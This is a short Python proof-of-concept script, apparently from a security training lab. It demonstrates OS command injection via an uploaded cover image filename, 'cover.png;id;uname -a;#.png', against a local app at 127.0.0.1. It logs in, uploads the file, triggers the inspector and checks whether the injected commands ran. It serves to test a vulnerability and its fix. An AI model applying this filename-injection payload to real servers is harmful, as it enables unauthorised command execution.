#!/usr/bin/env python3
"""VULN-2 PoC — OS command injection through the cover image filename.

LAB USE ONLY — targets http://127.0.0.1:5000.

    python poc/cmd_injection.py

Logs in as bob, creates a draft whose cover image is named
    cover.png;id;uname -a;#.png
then clicks "Inspect cover file". On the vulnerable build the server runs
`file <path>` through /bin/sh, so `id` and `uname -a` execute and their output
is shown in the page. After FIX-2 only the MIME type is shown.
"""
import html
import re

from lab_client import BASE, csrf, login

PNG_1X1 = bytes.fromhex(
    "89504e470d0a1a0a0000000d4948445200000001000000010806000000"
    "1f15c4890000000d49444154789c6360000002000154a24f5d0000000049454e44ae426082"
)
PAYLOAD = "cover.png;id;uname -a;#.png"


def main():
    s = login("bob", "bob-pass-123")
    r = s.post(
        f"{BASE}/write",
        data={"title": "Cover injection demo", "body": "demo", **csrf(s, f"{BASE}/write")},
        files={"cover": (PAYLOAD, PNG_1X1, "image/png")},
    )
    post_id = re.search(r"/post/(\d+)", r.url).group(1)
    print(f"[+] Created post {post_id} with cover filename: {PAYLOAD!r}")

    r = s.post(f"{BASE}/post/{post_id}/cover-info", data=csrf(s, f"{BASE}/post/{post_id}/edit"))
    m = re.search(r'<pre class="terminal">(.*?)</pre>', r.text, re.S)
    output = html.unescape(m.group(1)) if m else "(no inspector output)"
    print("[+] Server response from the cover inspector:\n")
    print(output)
    if "uid=" in output:
        print("\n[!] VULNERABLE: injected commands ran on the server.")
    else:
        print("\n[✓] Not exploitable: the filename was not interpreted by a shell.")


if __name__ == "__main__":
    main()
